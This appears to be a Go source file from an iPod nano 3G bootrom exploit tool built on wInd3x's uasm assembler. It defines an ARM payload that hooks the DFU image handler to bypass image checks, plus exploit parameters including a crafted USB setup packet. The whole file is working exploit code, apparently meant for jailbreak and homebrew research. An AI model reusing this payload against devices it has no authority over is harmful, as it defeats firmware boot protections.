package exploit

import "github.com/freemyipod/wInd3x/pkg/uasm"

func haxedDFUN3G(ret1Addr uint32) []uasm.Statement {
	return []uasm.Statement{
		// Copy descriptor to g_State->deviceDescriptor.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},

		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(379)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.R1},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("descriptor")},
		uasm.Ldrb{Dest: uasm.R2, Src: uasm.Deref(uasm.R1, 0)},

		uasm.Label("descriptor_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("descriptor_copy_loop")},
		uasm.B{Dest: uasm.LabelRef("on_image_hook_skip")},

		uasm.Label("on_image_hook"),

		// Save LR.
		uasm.Sub{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},
		uasm.Str{Src: uasm.LR, Dest: uasm.Deref(uasm.SP, 0)},

		// R0 = g_State->dfuBoot->img_addr2 (img1 header)
		uasm.Ldr{Dest: uasm.R4, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R4, 0)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R1, 1848)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 44)},
		// R1 = R0 + 0x800 (img1 body)
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x800)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.R0},
		// Call DFUBoot::CopyHeaderBody
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x20000ac4)},
		uasm.Blx{Dest: uasm.R2},

		// Set g_State->dfu_done = 1.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(1)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 44)},

		// Set g_State->img1_version = "1.0"
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x302e31)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 52)},
		// Set g_State->entrypoint = 0
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 48)},

		// Restore LR.
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Deref(uasm.SP, 0)},
		uasm.Add{Dest: uasm.SP, Src: uasm.SP, Compl: uasm.Immediate(4)},

		// Return 0.
		uasm.Mov{Dest: uasm.R0, Src: uasm.Immediate(0)},
		uasm.Bx{Dest: uasm.LR},

		uasm.Label("on_image_hook_skip"),

		// Copy on_image_hook to some free memory.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203d800)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.LabelRef("on_image_hook")},
		//uasm.Ldr{Dest: uasm.R2, Src: uasm.LabelRef("on_image_hook_skip")},
		// ... also need constant pool.
		//
		// TODO(q3k): add constant pool markers to uasm and unhardcode this
		// mess.
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x100)},
		uasm.Label("hook_copy_loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Sub{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("hook_copy_loop")},

		// Set g_State->dfuOnImage = 0x2203d800 (hook)
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2203fff8)},
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Deref(uasm.R0, 0)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x2203d800)},
		//uasm.Ldr{Dest: uasm.R1, Src: uasm.Constant(0x200034f0)},
		uasm.Str{Src: uasm.R1, Dest: uasm.Deref(uasm.R0, 40)},
	}
}

var epNano3G = &Parameters{
	DFUBufAddr: 0x22028220,
	ExecAddr:   0x220282A8,
	USBBufAddr: 0x22028A20,

	// No trampoline necessary.
	TrampolineAddr: 0,
	// b 0x2202dc08
	SetupPacket: []byte{0x20, 0xfe, 0xff, 0xea, 0x06, 0x00, 0x00, 0x00},

	HandlerFooter: []uasm.Statement{
		uasm.Bx{Dest: uasm.LR},
	},
	AESCall:         makeCall(0x20001f04, 0x22028220, 0x40, 1, 0, 0),
	HaxedDFUPayload: haxedDFUN3G(0),
}
